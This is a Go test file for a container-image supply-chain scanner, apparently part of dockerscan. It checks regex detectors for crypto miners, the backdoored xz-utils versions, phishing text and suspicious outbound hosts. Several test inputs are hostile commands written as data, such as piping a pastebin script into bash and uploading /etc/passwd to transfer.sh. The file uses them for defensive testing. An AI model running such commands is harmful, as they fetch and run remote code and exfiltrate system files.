package supplychain

import (
	"regexp"
	"strings"
	"testing"

	"github.com/cr0hn/dockerscan/v2/pkg/docker"
)

// --- Basic scanner metadata ---

func TestNewSupplyChainScanner_Name(t *testing.T) {
	s := NewSupplyChainScanner(nil)
	if s == nil {
		t.Fatal("expected non-nil scanner")
	}
	if s.Name() != "supply-chain" {
		t.Errorf("expected name 'supply-chain', got %q", s.Name())
	}
}

func TestNewSupplyChainScanner_Enabled(t *testing.T) {
	s := NewSupplyChainScanner(nil)
	if !s.Enabled() {
		t.Error("expected scanner to be enabled by default")
	}
}

// --- Miner pattern detection (logic extracted from detectCryptoMiners) ---
//
// The miner patterns are defined inline inside detectCryptoMiners. Since we
// are in the same package, we replicate the exact same map here so we can
// exercise the regex logic independently of Docker.

func buildMinerPatterns() map[string]*regexp.Regexp {
	return map[string]*regexp.Regexp{
		"xmrig_binary":      regexp.MustCompile(`(?i)(xmrig|xmr-stak|xmr-node-proxy)`),
		"claymore":          regexp.MustCompile(`(?i)(claymore|ethman|ethdcrminer)`),
		"mining_pool":       regexp.MustCompile(`(?i)(stratum\+tcp|stratum\+ssl|pool\.):\/\/`),
		"monero_wallet":     regexp.MustCompile(`(?i)(4[0-9AB][1-9A-HJ-NP-Za-km-z]{93})`),
		"mining_config":     regexp.MustCompile(`(?i)(pool\.supportxmr\.com|xmr-eu\.dwarfpool\.com|pool\.minexmr\.com)`),
		"mining_pool_ports": regexp.MustCompile(`:(?:3333|4444|5555|14444|14433|3357)\b`),
		"crypto_miner_cmd":  regexp.MustCompile(`(?i)(minerd|cpuminer|ccminer|ethminer|cgminer|bfgminer)`),
	}
}

func TestMinerPatterns_KnownMinerBinaries(t *testing.T) {
	patterns := buildMinerPatterns()

	tests := []struct {
		name        string
		content     string
		wantPattern string
		wantMatch   bool
	}{
		{
			name:        "xmrig binary name matches",
			content:     "CMD [\"/usr/bin/xmrig\", \"--config\", \"/etc/xmrig.json\"]",
			wantPattern: "xmrig_binary",
			wantMatch:   true,
		},
		{
			name:        "xmr-stak binary name matches",
			content:     "ENTRYPOINT [\"xmr-stak\"]",
			wantPattern: "xmrig_binary",
			wantMatch:   true,
		},
		{
			name:        "claymore miner matches",
			content:     "RUN wget claymore-miner.tar.gz",
			wantPattern: "claymore",
			wantMatch:   true,
		},
		{
			name:        "ethdcrminer matches",
			content:     "./ethdcrminer64 -epool eth.pool.example.com",
			wantPattern: "claymore",
			wantMatch:   true,
		},
		{
			name:        "stratum+tcp matches mining pool URL",
			content:     "pool=stratum+tcp://pool.minexmr.com:4444",
			wantPattern: "mining_pool",
			wantMatch:   true,
		},
		{
			name:        "stratum+ssl URL matches",
			content:     "STRATUM_URL=stratum+ssl://xmr.pool.example.com",
			wantPattern: "mining_pool",
			wantMatch:   true,
		},
		{
			name:        "known mining pool config matches",
			content:     "pool.supportxmr.com",
			wantPattern: "mining_config",
			wantMatch:   true,
		},
		{
			name:        "minexmr pool matches",
			content:     "pool.minexmr.com:443",
			wantPattern: "mining_config",
			wantMatch:   true,
		},
		{
			name:        "mining port 3333 matches",
			content:     "host:3333 --threads 4",
			wantPattern: "mining_pool_ports",
			wantMatch:   true,
		},
		{
			name:        "mining port 4444 matches",
			content:     "connect to pool:4444",
			wantPattern: "mining_pool_ports",
			wantMatch:   true,
		},
		{
			name:        "cpuminer command matches",
			content:     "RUN cpuminer -a cryptonight",
			wantPattern: "crypto_miner_cmd",
			wantMatch:   true,
		},
		{
			name:        "cgminer command matches",
			content:     "cgminer --algo scrypt",
			wantPattern: "crypto_miner_cmd",
			wantMatch:   true,
		},
		{
			name:        "normal web server has no miner pattern",
			content:     "RUN apt-get install -y nginx && nginx -g daemon off",
			wantPattern: "xmrig_binary",
			wantMatch:   false,
		},
		{
			name:        "regular port 8080 does not match mining ports",
			content:     "EXPOSE 8080",
			wantPattern: "mining_pool_ports",
			wantMatch:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pattern, ok := patterns[tt.wantPattern]
			if !ok {
				t.Fatalf("pattern %q not found in miner patterns map", tt.wantPattern)
			}

			matched := pattern.MatchString(tt.content)
			if matched != tt.wantMatch {
				t.Errorf("pattern %q against %q: expected match=%v, got match=%v",
					tt.wantPattern, tt.content, tt.wantMatch, matched)
			}
		})
	}
}

// --- Miner binary filename detection ---

func TestMinerBinaryFilename(t *testing.T) {
	// These are the known miner binary names checked in detectCryptoMiners
	minerBinaries := []string{
		"xmrig", "xmr-stak", "xmr-node-proxy",
		"claymore", "ethminer", "ethman",
		"minerd", "cpuminer", "ccminer",
		"cgminer", "bfgminer",
	}

	tests := []struct {
		name      string
		filename  string
		wantMatch bool
	}{
		{"exact xmrig match", "xmrig", true},
		{"exact cpuminer match", "cpuminer", true},
		{"xmrig in path basename", "xmrig", true},
		{"contains xmrig", "my-xmrig-binary", true},
		{"ethminer exact", "ethminer", true},
		{"cgminer", "cgminer", true},
		{"normal nginx binary", "nginx", false},
		{"python script", "app.py", false},
		{"partial non-match", "timer", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			baseLower := strings.ToLower(tt.filename)
			found := false
			for _, minerBin := range minerBinaries {
				if baseLower == minerBin || strings.Contains(baseLower, minerBin) {
					found = true
					break
				}
			}
			if found != tt.wantMatch {
				t.Errorf("filename %q: expected match=%v, got match=%v", tt.filename, tt.wantMatch, found)
			}
		})
	}
}

// --- Backdoor library detection logic ---
//
// We test the version matching logic used in detectBackdoorLibraries.

func isBackdooredLibrary(pkg docker.PackageInfo) bool {
	suspiciousLibraries := map[string][]string{
		"xz-utils": {"5.6.0", "5.6.1"},
		"liblzma5": {"5.6.0", "5.6.1"},
		"xz":       {"5.6.0", "5.6.1"},
		"liblzma":  {"5.6.0", "5.6.1"},
	}

	if versions, exists := suspiciousLibraries[pkg.Name]; exists {
		for _, badVersion := range versions {
			if pkg.Version == badVersion || strings.HasPrefix(pkg.Version, badVersion) {
				return true
			}
		}
	}
	return false
}

func TestBackdoorLibraryDetection(t *testing.T) {
	tests := []struct {
		name        string
		pkg         docker.PackageInfo
		wantMatch   bool
	}{
		{
			name:      "xz-utils 5.6.0 (backdoored version)",
			pkg:       docker.PackageInfo{Name: "xz-utils", Version: "5.6.0", Source: "dpkg"},
			wantMatch: true,
		},
		{
			name:      "xz-utils 5.6.1 (backdoored version)",
			pkg:       docker.PackageInfo{Name: "xz-utils", Version: "5.6.1", Source: "dpkg"},
			wantMatch: true,
		},
		{
			name:      "liblzma5 5.6.0 (backdoored version)",
			pkg:       docker.PackageInfo{Name: "liblzma5", Version: "5.6.0", Source: "dpkg"},
			wantMatch: true,
		},
		{
			name:      "xz 5.6.0-1ubuntu1 (version prefix match)",
			pkg:       docker.PackageInfo{Name: "xz", Version: "5.6.0-1ubuntu1", Source: "dpkg"},
			wantMatch: true,
		},
		{
			name:      "liblzma 5.6.1+dfsg-1 (version prefix match)",
			pkg:       docker.PackageInfo{Name: "liblzma", Version: "5.6.1+dfsg-1", Source: "dpkg"},
			wantMatch: true,
		},
		{
			name:      "xz-utils 5.4.5 (safe version)",
			pkg:       docker.PackageInfo{Name: "xz-utils", Version: "5.4.5", Source: "dpkg"},
			wantMatch: false,
		},
		{
			name:      "xz-utils 5.2.4 (safe older version)",
			pkg:       docker.PackageInfo{Name: "xz-utils", Version: "5.2.4", Source: "dpkg"},
			wantMatch: false,
		},
		{
			name:      "openssl 3.0.2 (unrelated safe package)",
			pkg:       docker.PackageInfo{Name: "openssl", Version: "3.0.2", Source: "dpkg"},
			wantMatch: false,
		},
		{
			name:      "curl 7.88 (unrelated safe package)",
			pkg:       docker.PackageInfo{Name: "curl", Version: "7.88.1-10+deb12u6", Source: "dpkg"},
			wantMatch: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isBackdooredLibrary(tt.pkg)
			if result != tt.wantMatch {
				t.Errorf("package %s@%s: expected backdoored=%v, got %v",
					tt.pkg.Name, tt.pkg.Version, tt.wantMatch, result)
			}
		})
	}
}

// --- Phishing pattern detection ---
//
// We replicate the phishing patterns from scanPhishingContent and test them directly.

func buildPhishingPatterns() map[string]*regexp.Regexp {
	return map[string]*regexp.Regexp{
		"verify_account":    regexp.MustCompile(`(?i)verify\s+(your|the)\s+account`),
		"suspended":         regexp.MustCompile(`(?i)(account|service|access).*suspended`),
		"click_immediately": regexp.MustCompile(`(?i)(click|act)\s+(here\s+)?(immediately|now|urgently)`),
		"confirm_identity":  regexp.MustCompile(`(?i)confirm\s+(your\s+)?(identity|credentials)`),
		"urgent_action":     regexp.MustCompile(`(?i)urgent\s+action\s+required`),
		"account_closure":   regexp.MustCompile(`(?i)account\s+will\s+be\s+(closed|terminated|deleted)`),
		"prize_winner":      regexp.MustCompile(`(?i)(you\s+)?(won|winner|prize|lottery|inheritance)`),
		"payment_required":  regexp.MustCompile(`(?i)(urgent\s+)?payment\s+(is\s+)?(required|needed|overdue)`),
		"reset_password":    regexp.MustCompile(`(?i)reset\s+(your\s+)?password\s+(immediately|now)`),
		"suspicious_url":    regexp.MustCompile(`(?i)(bit\.ly|tinyurl|goo\.gl|t\.co)/[a-zA-Z0-9]+`),
	}
}

func TestPhishingPatterns(t *testing.T) {
	patterns := buildPhishingPatterns()

	tests := []struct {
		name        string
		content     string
		wantPattern string
		wantMatch   bool
	}{
		{
			name:        "verify account phrase matches",
			content:     "Please verify your account to continue.",
			wantPattern: "verify_account",
			wantMatch:   true,
		},
		{
			name:        "verify the account matches",
			content:     "Click here to verify the account immediately",
			wantPattern: "verify_account",
			wantMatch:   true,
		},
		{
			name:        "account suspended matches",
			content:     "Your account has been suspended due to suspicious activity.",
			wantPattern: "suspended",
			wantMatch:   true,
		},
		{
			name:        "click here immediately matches",
			content:     "click here immediately to restore access",
			wantPattern: "click_immediately",
			wantMatch:   true,
		},
		{
			name:        "act now urgently matches",
			content:     "ACT NOW URGENTLY",
			wantPattern: "click_immediately",
			wantMatch:   true,
		},
		{
			name:        "confirm identity matches",
			content:     "You must confirm your identity before proceeding.",
			wantPattern: "confirm_identity",
			wantMatch:   true,
		},
		{
			name:        "urgent action required matches",
			content:     "URGENT ACTION REQUIRED: Login immediately.",
			wantPattern: "urgent_action",
			wantMatch:   true,
		},
		{
			name:        "account will be closed matches",
			content:     "Your account will be closed in 24 hours.",
			wantPattern: "account_closure",
			wantMatch:   true,
		},
		{
			name:        "account will be terminated matches",
			content:     "account will be terminated unless you act",
			wantPattern: "account_closure",
			wantMatch:   true,
		},
		{
			name:        "you won prize matches",
			content:     "Congratulations, you won a prize!",
			wantPattern: "prize_winner",
			wantMatch:   true,
		},
		{
			name:        "payment required matches",
			content:     "Payment is required to continue using the service.",
			wantPattern: "payment_required",
			wantMatch:   true,
		},
		{
			name:        "urgent payment overdue matches",
			content:     "urgent payment overdue",
			wantPattern: "payment_required",
			wantMatch:   true,
		},
		{
			name:        "reset password immediately matches",
			content:     "reset your password immediately",
			wantPattern: "reset_password",
			wantMatch:   true,
		},
		{
			name:        "bit.ly URL shortener matches",
			content:     "Click here: bit.ly/abc123xyz",
			wantPattern: "suspicious_url",
			wantMatch:   true,
		},
		{
			name:        "tinyurl matches",
			content:     "Download at tinyurl/xyz789",
			wantPattern: "suspicious_url",
			wantMatch:   true,
		},
		{
			name:        "legitimate readme has no phishing pattern",
			content:     "# MyApp\n\nA simple application to process data. Run with `docker run myapp`.",
			wantPattern: "urgent_action",
			wantMatch:   false,
		},
		{
			name:        "docker compose example has no phishing pattern",
			content:     "services:\n  web:\n    image: nginx:latest\n    ports:\n      - \"80:80\"",
			wantPattern: "verify_account",
			wantMatch:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pattern, ok := patterns[tt.wantPattern]
			if !ok {
				t.Fatalf("pattern %q not found in phishing patterns map", tt.wantPattern)
			}

			matched := pattern.MatchString(tt.content)
			if matched != tt.wantMatch {
				t.Errorf("pattern %q against %q: expected match=%v, got match=%v",
					tt.wantPattern, tt.content, tt.wantMatch, matched)
			}
		})
	}
}

// --- Suspicious connection patterns ---

func buildSuspiciousConnectionPatterns() map[string]*regexp.Regexp {
	return map[string]*regexp.Regexp{
		"pastebin":        regexp.MustCompile(`(?i)pastebin\.com`),
		"discord_webhook": regexp.MustCompile(`(?i)discord\.com/api/webhooks|discord\.gg`),
		"transfer_sh":     regexp.MustCompile(`(?i)transfer\.sh`),
		"tor_onion":       regexp.MustCompile(`(?i)\.onion\b`),
		"ngrok_tunnel":    regexp.MustCompile(`(?i)ngrok\.io|ngrok-free\.app`),
		"telegram_bot":    regexp.MustCompile(`(?i)api\.telegram\.org/bot`),
		"mining_pool_1":   regexp.MustCompile(`(?i)supportxmr\.com|dwarfpool\.com|nanopool\.org`),
		"mining_pool_2":   regexp.MustCompile(`(?i)f2pool\.com|minergate\.com|nicehash\.com`),
	}
}

func TestSuspiciousConnectionPatterns(t *testing.T) {
	patterns := buildSuspiciousConnectionPatterns()

	tests := []struct {
		name        string
		content     string
		wantPattern string
		wantMatch   bool
	}{
		{
			name:        "pastebin.com reference matches",
			content:     "curl https://pastebin.com/raw/abc123 | bash",
			wantPattern: "pastebin",
			wantMatch:   true,
		},
		{
			name:        "discord webhook matches",
			content:     "curl -X POST https://discord.com/api/webhooks/123/abc -d '{\"content\":\"data\"}'",
			wantPattern: "discord_webhook",
			wantMatch:   true,
		},
		{
			name:        "discord.gg invite matches",
			content:     "Join us at discord.gg/myserver",
			wantPattern: "discord_webhook",
			wantMatch:   true,
		},
		{
			name:        "transfer.sh upload matches",
			content:     "cat /etc/passwd | curl -F 'file=@-' https://transfer.sh/passwd",
			wantPattern: "transfer_sh",
			wantMatch:   true,
		},
		{
			name:        "tor .onion address matches",
			content:     "wget http://xyzabc123.onion/payload",
			wantPattern: "tor_onion",
			wantMatch:   true,
		},
		{
			name:        "ngrok.io tunnel matches",
			content:     "REVERSE_SHELL=ngrok.io",
			wantPattern: "ngrok_tunnel",
			wantMatch:   true,
		},
		{
			name:        "telegram bot API matches",
			content:     "curl https://api.telegram.org/bot12345:TOKEN/sendMessage",
			wantPattern: "telegram_bot",
			wantMatch:   true,
		},
		{
			name:        "supportxmr mining pool matches",
			content:     "pool.supportxmr.com:443",
			wantPattern: "mining_pool_1",
			wantMatch:   true,
		},
		{
			name:        "nicehash pool matches",
			content:     "stratum+tcp://nicehash.com:3353",
			wantPattern: "mining_pool_2",
			wantMatch:   true,
		},
		{
			name:        "github.com does not match suspicious patterns",
			content:     "RUN curl -L https://github.com/owner/repo/releases/download/v1.0/app -o /usr/bin/app",
			wantPattern: "pastebin",
			wantMatch:   false,
		},
		{
			name:        "normal apt-get install has no suspicious pattern",
			content:     "RUN apt-get update && apt-get install -y curl",
			wantPattern: "tor_onion",
			wantMatch:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pattern, ok := patterns[tt.wantPattern]
			if !ok {
				t.Fatalf("pattern %q not found", tt.wantPattern)
			}

			matched := pattern.MatchString(tt.content)
			if matched != tt.wantMatch {
				t.Errorf("pattern %q against %q: expected match=%v, got match=%v",
					tt.wantPattern, tt.content, tt.wantMatch, matched)
			}
		})
	}
}

// --- Imageless container layer logic ---

func TestImagelessContainerLayerCheck(t *testing.T) {
	// This tests the logic used in detectImagelessContainers without Docker.
	// The scanner checks: hasLayers = imageInfo.LayerCount > 0 && len(imageInfo.RootFS.Layers) > 0
	type imageInfoStub struct {
		LayerCount int
		RootFSLen  int
	}

	isImageless := func(info imageInfoStub) bool {
		return !(info.LayerCount > 0 && info.RootFSLen > 0)
	}

	isSuspiciouslyMinimal := func(info imageInfoStub) bool {
		hasLayers := info.LayerCount > 0 && info.RootFSLen > 0
		return hasLayers && info.LayerCount <= 2
	}

	tests := []struct {
		name               string
		info               imageInfoStub
		expectImageless    bool
		expectMinimal      bool
	}{
		{
			name:            "no layers at all - imageless",
			info:            imageInfoStub{LayerCount: 0, RootFSLen: 0},
			expectImageless: true,
			expectMinimal:   false,
		},
		{
			name:            "layer count 0 but rootfs has entries - imageless",
			info:            imageInfoStub{LayerCount: 0, RootFSLen: 2},
			expectImageless: true,
			expectMinimal:   false,
		},
		{
			name:            "1 layer - suspicious minimal",
			info:            imageInfoStub{LayerCount: 1, RootFSLen: 1},
			expectImageless: false,
			expectMinimal:   true,
		},
		{
			name:            "2 layers - suspicious minimal",
			info:            imageInfoStub{LayerCount: 2, RootFSLen: 2},
			expectImageless: false,
			expectMinimal:   true,
		},
		{
			name:            "3 layers - normal application image",
			info:            imageInfoStub{LayerCount: 3, RootFSLen: 3},
			expectImageless: false,
			expectMinimal:   false,
		},
		{
			name:            "10 layers - normal",
			info:            imageInfoStub{LayerCount: 10, RootFSLen: 10},
			expectImageless: false,
			expectMinimal:   false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotImageless := isImageless(tt.info)
			if gotImageless != tt.expectImageless {
				t.Errorf("isImageless(%+v): expected %v, got %v", tt.info, tt.expectImageless, gotImageless)
			}

			gotMinimal := isSuspiciouslyMinimal(tt.info)
			if gotMinimal != tt.expectMinimal {
				t.Errorf("isSuspiciouslyMinimal(%+v): expected %v, got %v", tt.info, tt.expectMinimal, gotMinimal)
			}
		})
	}
}
